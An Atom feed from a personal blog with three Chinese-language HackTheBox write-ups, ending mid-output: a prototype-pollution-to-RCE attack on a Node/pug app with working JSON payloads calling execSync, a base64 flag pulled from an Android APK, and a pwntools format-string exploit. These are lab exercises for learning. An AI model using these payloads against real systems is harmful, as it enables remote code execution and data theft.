<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>kazma&#39;s blog</title>
  
  <subtitle>Decoding My Life: Tales of Code, Cyber, and Campus Life</subtitle>
  <link href="https://kazma.tw/atom.xml" rel="self"/>
  
  <link href="https://kazma.tw/"/>
  <updated>2024-10-30T16:10:09.888Z</updated>
  <id>https://kazma.tw/</id>
  
  <author>
    <name>kazma</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HackTheBox-Challenges Gunship Writeup</title>
    <link href="https://kazma.tw/2024/10/30/HackTheBox-Challenges-Gunship-Writeup/"/>
    <id>https://kazma.tw/2024/10/30/HackTheBox-Challenges-Gunship-Writeup/</id>
    <published>2024-10-30T14:49:00.775Z</published>
    <updated>2024-10-30T16:10:09.888Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>這次要來做的是一題 Web 而且有附上 Source Code 還有 Dockerfile，網站畫面很漂亮，只有一個輸入點。<br>這題雖然標非常簡單但個人認為有很多值得我們探討的知識點，一起來研究吧。</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這題的檔案結構如下：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">╰─ tree .                                                                                                           ─╯</span><br><span class="line">.</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── build-docker.sh</span><br><span class="line">├── challenge</span><br><span class="line">│   ├── flag</span><br><span class="line">│   ├── index.js</span><br><span class="line">│   ├── package.json</span><br><span class="line">│   ├── routes</span><br><span class="line">│   │   └── index.js</span><br><span class="line">│   ├── static</span><br><span class="line">│   │   ├── css</span><br><span class="line">│   │   │   └── main.css</span><br><span class="line">│   │   ├── images</span><br><span class="line">│   │   │   └── favicon.png</span><br><span class="line">│   │   └── js</span><br><span class="line">│   │       └── main.js</span><br><span class="line">│   ├── views</span><br><span class="line">│   │   └── index.html</span><br><span class="line">│   └── yarn.lock</span><br><span class="line">├── config</span><br><span class="line">│   └── supervisord.conf</span><br><span class="line">└── entrypoint.sh</span><br><span class="line"></span><br><span class="line">9 directories, 13 files</span><br></pre></td></tr></table></figure></div><p>程式碼不多，其中特別直得注意的是 index.js。</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path              = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> express           = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> pug        = <span class="built_in">require</span>(<span class="string">&#x27;pug&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; unflatten &#125;     = <span class="built_in">require</span>(<span class="string">&#x27;flat&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router            = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="string">&#x27;views/index.html&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/submit&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; artist &#125; = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Haigh&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Westaway&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Gingell&#x27;</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line"><span class="string">&#x27;response&#x27;</span>: pug.<span class="title function_">compile</span>(<span class="string">&#x27;span Hello #&#123;user&#125;, thank you for letting us know!&#x27;</span>)(&#123; <span class="attr">user</span>: <span class="string">&#x27;guest&#x27;</span> &#125;)</span><br><span class="line">&#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line"><span class="string">&#x27;response&#x27;</span>: <span class="string">&#x27;Please provide us with the full name of an existing member.&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure></div><p>其中特別值得拿出來說明的是：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/submit&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; artist &#125; = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure></div><p>上面這段就是唯一使用者輸入的 post 請求，unflattern 則是會把平面化的資料還原成嵌套的物件，這代表 req.body 可以包含類似 <code>&#123;&quot;artist.name&quot;: &quot;Haigh&quot;&#125;</code> 這樣的平面資料，透過 unflatten 轉換成 <code>&#123; artist: &#123; name: &quot;Haigh&quot; &#125; &#125;</code>。<br>然後 <code>const &#123; artist &#125; = unflatten(req.body);</code> 會從中提取 artist 字段。<br>再來是檢查條件：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Haigh&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Westaway&#x27;</span>) || artist.<span class="property">name</span>.<span class="title function_">includes</span>(<span class="string">&#x27;Gingell&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="string">&#x27;response&#x27;</span>: pug.<span class="title function_">compile</span>(<span class="string">&#x27;span Hello #&#123;user&#125;, thank you for letting us know!&#x27;</span>)(&#123; <span class="attr">user</span>: <span class="string">&#x27;guest&#x27;</span> &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">        <span class="string">&#x27;response&#x27;</span>: <span class="string">&#x27;Please provide us with the full name of an existing member.&#x27;</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>會檢查是否包含特定名字，符合條件就會使用 <code>pug.compile</code> 生成 HTML 內容，並傳入一個變數 user（值為 ‘guest’），產生類似 Hello guest, thank you for letting us know! 的訊息。<br>那上面提到的這兩段其實是有 Prototype Pollution 的風險，因為這段程式碼使用 unflatten 解析使用者輸入的 req.body，而如果使用者輸入了特殊鍵值（如 <strong>proto</strong> 或 constructor），在解展後可能改變 Object.prototype 的內容，造成原型污染。舉例：</p><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 攻擊者如果輸入:</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;artist.name&quot;</span>: <span class="string">&quot;Haigh&quot;</span>,</span><br><span class="line">  <span class="string">&quot;__proto__.polluted&quot;</span>: <span class="string">&quot;malicious&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解展後的物件可能污染全域原型</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">polluted</span>); <span class="comment">// &quot;malicious&quot;</span></span><br></pre></td></tr></table></figure></div><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>首先我們的首要目標是要觸發 <code>pug.compile</code>，因為我們可以試圖透過 prototype pollution 讓 pug 在渲染的時候使用被我們污染的 block 物件，執行 <code>execSync()</code> 之類的指令操作。<br>所以我們可以透過 burp 去攔截 &#x2F;api&#x2F;submit 的封包，然後把 content 換成：</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;$(ls | grep flag)&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>然後正常來說我們是看不到輸出的，所以有些人可能會透過 reverse shell 來解這題，但這裡提供一個有趣的解法是，我們可以透過執行 <code>$(ls | grep flag)</code> 讓指令執行的結果變成不能運行的指令，然後跟著錯誤訊息印出來，舉例像是如果我們執行：</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;kazma&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>我們會得到：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Command failed: kazma&lt;br&gt;/bin/sh: kazma: not found&lt;br&gt; on line 1&lt;br&gt;</span><br></pre></td></tr></table></figure></div><p>所以在這邊 kazma 被當成指令執行，所以根成錯誤訊息印出來，同樣的我們其他指令執行的結果也會被當成無法執行的指令印出來，就可以看到輸出了，所以我們接著來拿 flag：</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;$(ls | grep flag)&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>我們送出上面的請求可以拿到下面的回應：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Command failed: $(ls | grep flag)&lt;br&gt;/bin/sh: flagvAbC2: not found&lt;br&gt; on line 1&lt;br&gt;</span><br></pre></td></tr></table></figure></div><p>所以檔案名稱是 <code>flagvAbC2</code>，不過我們直接 cat flag* 也可以：</p><div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;artist.name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Haigh&quot;</span><span class="punctuation">,</span><span class="attr">&quot;__proto__.block&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Text&quot;</span><span class="punctuation">,</span> </span><br><span class="line"><span class="attr">&quot;line&quot;</span><span class="punctuation">:</span> <span class="string">&quot;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;$(cat flag*)&#x27;)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div><p>得到：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Command failed: $(cat flag*)&lt;br&gt;/bin/sh: HTB&#123;wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!&#125;: not found&lt;br&gt; on line 1&lt;br&gt;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/gunship_pwn.png"                      alt="pwn"                ></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a class="link"   href="https://harshitm98.github.io/posts/htb-challenge-gunship/" >https://harshitm98.github.io/posts/htb-challenge-gunship/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;這次要來做的是一題 Web 而且有附上 Source Code 還有 Dockerfile，網站畫面很漂亮，只有一個</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="prototype-pollution" scheme="https://kazma.tw/tags/prototype-pollution/"/>
    
    <category term="ast-injection" scheme="https://kazma.tw/tags/ast-injection/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Don&#39;t Overreact Writeup</title>
    <link href="https://kazma.tw/2024/10/30/HackTheBox-Challenges-Don-t-Overreact-Writeup/"/>
    <id>https://kazma.tw/2024/10/30/HackTheBox-Challenges-Don-t-Overreact-Writeup/</id>
    <published>2024-10-30T13:34:48.008Z</published>
    <updated>2024-10-30T13:46:10.856Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>這題是 mobile 的挑戰，給了一個 .apk。<br>.apk（Android Package）是一種用於 Android 應用程式的安裝包格式，類似 Windows 上的 .exe 或是 MacOS 的 .app，包含應用程式的所有資源、原始碼和配置文件，讓我們可以在 Android 上面安裝執行。</p><p>.apk 檔案的結構基本上是壓縮檔（ZIP 格式），內部包含以下幾種重要元件：<br>1.AndroidManifest.xml：應用程式的主要配置檔，包含應用的名稱、圖示、版本資訊、所需的權限（如相機、網路）以及各種活動（Activity）、服務（Service）等。<br>2.classes.dex：包含編譯過的 Android 應用程式碼，使用的是 Dalvik 位元組碼格式，這是 Android 特有的 Java 位元組碼格式。<br>3.res&#x2F; 資料夾：包含應用的資源檔案，如 UI 佈局、圖示、圖片和字串等。<br>4.lib&#x2F; 資料夾：包含應用所需的本地函式庫檔案（如 C 或 C++ 編寫的庫），針對不同的 CPU 架構（如 ARM 或 x86）有不同的子資料夾。<br>5.META-INF&#x2F; 資料夾：包含簽章檔案，用來確保 .apk 未被篡改，保護應用的完整性和安全性。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>因為是壓縮檔我們可以先執行：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip app-release.apk -d app_release</span><br></pre></td></tr></table></figure></div><p>然後就嘗試 grep 一些關鍵字像是 htb, hackthebox 就看到下面的資訊：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ grep -ri hackthebox                                                                                              ─╯</span><br><span class="line">./assets/index.android.bundle:__d(<span class="keyword">function</span>(g,r,i,a,m,e,d)&#123;Object.defineProperty(e,<span class="string">&quot;__esModule&quot;</span>,&#123;value:!0&#125;),e.myConfig=void 0;var t=&#123;importantData:<span class="string">&quot;baNaNa&quot;</span>.toLowerCase(),apiUrl:<span class="string">&#x27;https://www.hackthebox.eu/&#x27;</span>,debug:<span class="string">&#x27;SFRCezIzbTQxbl9jNDFtXzRuZF9kMG43XzB2MzIyMzRjN30=&#x27;</span>&#125;;e.myConfig=t&#125;,400,[]);</span><br></pre></td></tr></table></figure></div><p>然後看到一串可疑的 base64：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">╰─ <span class="built_in">echo</span> <span class="string">&quot;SFRCezIzbTQxbl9jNDFtXzRuZF9kMG43XzB2MzIyMzRjN30=&quot;</span> | <span class="built_in">base64</span> -d                                              ─╯</span><br><span class="line">HTB&#123;23m41n_c41m_4nd_d0n7_0v32234c7&#125;</span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/react_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;這題是 mobile 的挑戰，給了一個 .apk。&lt;br&gt;.apk（Android Package）是一種用於 An</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="android" scheme="https://kazma.tw/tags/android/"/>
    
    <category term="mobile" scheme="https://kazma.tw/tags/mobile/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges racecar Writeup</title>
    <link href="https://kazma.tw/2024/10/28/HackTheBox-Challenges-racecar-Writeup/"/>
    <id>https://kazma.tw/2024/10/28/HackTheBox-Challenges-racecar-Writeup/</id>
    <published>2024-10-28T13:32:58.318Z</published>
    <updated>2024-10-28T18:24:57.623Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>首先這題是保護全開，然後我們先跑個幾次測試之後就可以得到資訊是前面的 Name 跟 Nickname 不重要，然後我們選第一台車跑第二張圖，或是第二台車跑第一張圖就可以比較容易贏得遊戲。遊戲勝利後他會去打開 flag.txt 所以我們需要先隨便設定一個 flag.txt，但是他只會打開不會輸出出來，丟進去 ida 後就會看到這邊在最後得獎感言的部分有一個 printf 的 format string 洞如下：</p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( car_choice == <span class="number">1</span> &amp;&amp; (result = v9, v9 &lt; v11) || car_choice == <span class="number">2</span> &amp;&amp; (result = v9, v9 &gt; v11) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n[+] You won the race!! You get 100 coins!\n&quot;</span>, <span class="string">&quot;\x1B[1;32m&quot;</span>);</span><br><span class="line">  coins += <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] Current coins: [%d]%s\n&quot;</span>, coins);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[!] Do you have anything to say to the press after your big victory?\n&gt; %s&quot;</span>, <span class="string">&quot;\x1B[0m&quot;</span>);</span><br><span class="line">  speech = <span class="built_in">malloc</span>(<span class="number">369</span>);</span><br><span class="line">  flag_file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !flag_file )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s[-] Could not open flag.txt. Please contact the creator.\n&quot;</span>, <span class="string">&quot;\x1B[1;31m&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">105</span>, v5, <span class="string">&quot;\x1B[1;36m&quot;</span>, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="number">44</span>, flag_file);</span><br><span class="line">  read(<span class="number">0</span>, speech, <span class="number">368</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n\x1B[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world to know this: \x1B[0m&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(speech, v6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>所以我們可以透過 format string 印出 flag.txt 的內容，然後我們可以先透過 gdb 來看 flag 的位置然後寫出我們的 exploit 來幫我們解出 flag。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/racecar_gdb.png"                      alt="gdb"                ><br>我們本地的 flag 設定成：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;aaaabbbb&quot;</span> &gt; flag.txt</span><br></pre></td></tr></table></figure></div><p>所以他的 hex 值會是 0x6161616162626262，方便我們觀察，然後我在 gdb 輸入了 beef 可以觀察到他們的位置關係，當然我覺得直接印出來觀察也是一個不錯的方式。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.48.79&quot;</span>, <span class="number">54556</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&quot;@&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>, <span class="number">25</span>):</span><br><span class="line">    p += <span class="string">&quot;%&#123;&#125;$p&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">p += <span class="string">&quot;#&quot;</span></span><br><span class="line">r.sendlineafter(<span class="string">b&quot;Name:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;Nickname:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&quot;&gt;&quot;</span>, p)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;@&quot;</span>)</span><br><span class="line">s = r.recvuntil(<span class="string">b&quot;#&quot;</span>).strip(<span class="string">b&quot;#&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> ss <span class="keyword">in</span> s.split(<span class="string">b&quot;0x&quot;</span>):</span><br><span class="line">    <span class="keyword">if</span> ss == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    tmp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ss) // <span class="number">2</span>):</span><br><span class="line">        tmp += <span class="built_in">chr</span>(<span class="built_in">int</span>(ss[i * <span class="number">2</span> : i * <span class="number">2</span> + <span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">    flag += tmp[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>執行結果：</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py</span><br><span class="line">[+] Opening connection to 94.237.48.79 on port 54556: 